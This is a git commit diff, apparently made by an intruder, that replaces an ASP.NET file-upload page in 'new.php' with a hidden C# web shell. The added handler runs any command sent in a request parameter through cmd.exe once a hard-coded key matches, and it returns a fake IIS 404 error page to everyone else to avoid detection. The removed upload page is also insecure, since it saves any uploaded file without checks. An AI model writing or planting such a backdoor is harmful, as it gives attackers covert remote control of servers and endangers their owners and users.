3898b6305bba9880117dbf15d32e82dba2ea84a7
h4cked-11 <ranoxpvp@gmail.com>
2024-07-02 17:22:34 +0700

    Update new.php

--- new.php
+++ new.php
@@ -1,41 +1,36 @@
-<%@ Page Language="C#" %>
-<!DOCTYPE html>
+<%@ WebHandler Language="C#" Class="Handler2" %>
+using System;
+using System.Collections.Generic; 
+using System.Diagnostics;
+using System.Web;
+public class Handler2 : IHttpHandler {
+public void ProcessRequest (HttpContext context) {
+	string b = context.Request["key"];
+	string x = context.Request["010101"];
+	if(b == "HSEnumberoan"){
+		Process prc=new Process(); 
+		prc.StartInfo.FileName="cmd.exe"; 
+		prc.StartInfo.UseShellExecute=false; 
+		prc.StartInfo.RedirectStandardInput = true; 
+		prc.StartInfo.RedirectStandardOutput = true; 
+		prc.StartInfo.RedirectStandardError = true; 
+		prc.StartInfo.CreateNoWindow = false; 
+		prc.Start();
+		prc.StandardInput.WriteLine(x);
+		prc.StandardInput.Close();
+		context.Response.Write(prc.StandardOutput.ReadToEnd());
+		context.Response.End();
+	}
+	else {
 
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head runat="server">
-    <title>Upload File</title>
-</head>
-<body>
-    <form id="formUpload" runat="server" enctype="multipart/form-data">
-        <div>
-            <input type="file" id="fileUpload" runat="server" />
-            <br />
-            <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
-        </div>
-    </form>
-
-    <%
-        if (IsPostBack)
-        {
-            if (Request.Files.Count > 0)
-            {
-                HttpPostedFile file = Request.Files[0];
-                if (file != null && file.ContentLength > 0)
-                {
-                    try
-                    {
-                        string filename = Path.GetFileName(file.FileName);
-                        string path = Server.MapPath("~/uploads/" + filename);
-                        file.SaveAs(path);
-                        Response.Write("Upload thành công!");
-                    }
-                    catch (Exception ex)
-                    {
-                        Response.Write("Lỗi: " + ex.Message);
-                    }
-                }
-            }
-        }
-    %>
-</body>
-</html>
+		context.Response.Write("<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>");
+		context.Response.Write("<html xmlns='http://www.w3.org/1999/xhtml'><head><meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'/><title>404 - File or directory not found.</title>");
+		context.Response.Write("<style type='text/css'><!--body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}fieldset{padding:0 15px 10px 15px;} h1{font-size:2.4em;margin:0;color:#FFF;}h2{font-size:1.7em;margin:0;color:#CC0000;} h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} #header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:'trebuchet MS', Verdana, sans-serif;color:#FFF;background-color:#555555;}#content{margin:0 0 0 2%;position:relative;}.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}--></style></head><body><div id='header'><h1>Server Error</h1></div><div id='content'>");
+		context.Response.Write("<div class='content-container'><fieldset><h2>404 - File or directory not found.</h2><h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3></fieldset></div></div></body></html>");
+	}
+}
+public bool IsReusable {
+	get {
+	return false;
+	}
+}}
